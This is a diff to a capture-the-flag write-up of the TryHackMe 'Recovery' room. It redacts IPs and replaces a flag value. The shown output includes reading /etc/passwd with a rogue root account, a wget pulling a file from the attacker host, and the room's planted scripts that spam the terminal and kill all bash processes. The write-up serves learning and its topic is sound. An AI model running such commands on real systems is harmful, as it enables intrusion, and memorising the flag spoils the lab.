@@ -40,8 +40,8 @@ Your friend Alex</p>
 
 <p><em>Answer the question below</em></p>
 
-<p>1.1. What is the flag?<br>
-<code>THM{AI_NOT_AI}</code></p>
+<p>1.1. Flag 0<br>
+<code>THM{d8b5c89061ed767547a782e0f9b0b0fe}</code></p>
 
 <br>
 
@@ -63,8 +63,8 @@ man ssh
 ```
 
 ```bash
-:~# ssh alex@10.10.38.21 /bin/sh
-alex@10.10.38.21's password: 
+:~# ssh alex@1TargetIP /bin/sh
+alex@TargetIP's password: 
 id
 uid=1000(alex) gid=1000(alex) groups=1000(alex)
 pwd
@@ -198,10 +198,12 @@ while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
 $ rm -rf .bashrc
 ```
 
+<br>
+
 ```bash
-root@ip-10-10-154-200:~/Recovery# ssh alex@10.10.95.198
-alex@10.10.95.198's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64
+:~/Recovery# ssh alex@TargetIP
+alex@TargetIP's password: 
+Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu ... UTC 2020 x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -213,9 +215,9 @@ alex@recoveryserver:~$
 ```
 
 ```bash
-:~/Recovery# ssh alex@10.10.95.198 -T
-alex@10.10.95.198's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64
+:~/Recovery# ssh alex@TargetIP -T
+alex@TargetIP's password: 
+Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu ...UTC 2020 x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -238,9 +240,9 @@ fixutil: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically lin
 <p>encoded the fix file to base64</p>
 
 ```bash
-:~/Recovery# ssh alex@10.10.95.198
-alex@10.10.95.198's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64
+:~/Recovery# ssh alex@TargetIP
+alex@TargetIP's password: 
+Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu ... UTC 2020 x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -248,18 +250,16 @@ individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-Last login: Sat Jul  5 22:12:30 2025 from 10.10.154.200
-alex@recoveryserver:~$ wget http://10.10.154.200:8000/.bashrc
---2025-07-05 22:22:20--  http://10.10.154.200:8000/.bashrc
-Connecting to 10.10.154.200:8000... connected.
+...
+alex@recoveryserver:~$ wget http://1AttackIP:8000/.bashrc
+--2025-07-05 22:22:20--  http://AttackIP:8000/.bashrc
+Connecting to AttackIP:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 4700 (4.6K) [application/octet-stream]
 Saving to: '.bashrc'
 
 .bashrc                                    100%[=======================================================================================>]   4.59K  --.-KB/s    in 0s      
-
-2025-07-05 22:22:20 (650 MB/s) - '.bashrc' saved [4700/4700]
-
+...
 alex@recoveryserver:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -289,11 +289,11 @@ sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
 alex:x:1000:1000::/home/alex:/bin/bash
 security:x:0:0::/home/security:/bin/sh
 alex@recoveryserver:~$ logout
-Connection to 10.10.95.198 closed.
+Connection to TargetIP closed.
 ```
 
 ```bash
-:~/Recovery# ssh alex@10.10.95.198
+:~/Recovery# ssh alex@1TargetIP
 ...
 alex@recoveryserver:~$ admin
 Welcome to the Recoverysoft Administration Tool! Please input your password:
@@ -302,7 +302,7 @@ Incorrect password! This will be logged!
 /bin/mv: cannot stat '/tmp/logging.so': No such file or directory
 alex@recoveryserver:~$ exit
 logout
-Connection to 10.10.95.198 closed.
+Connection to 1TargetIP closed.
 
 ```
 
@@ -318,7 +318,7 @@ alex@recoveryserver:/opt$ cat brilliant_script.sh
 
 for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
 alex@recoveryserver:/opt$ logout
-Connection to 10.10.95.198 closed.
+Connection to TargetIP closed.
 
 
 
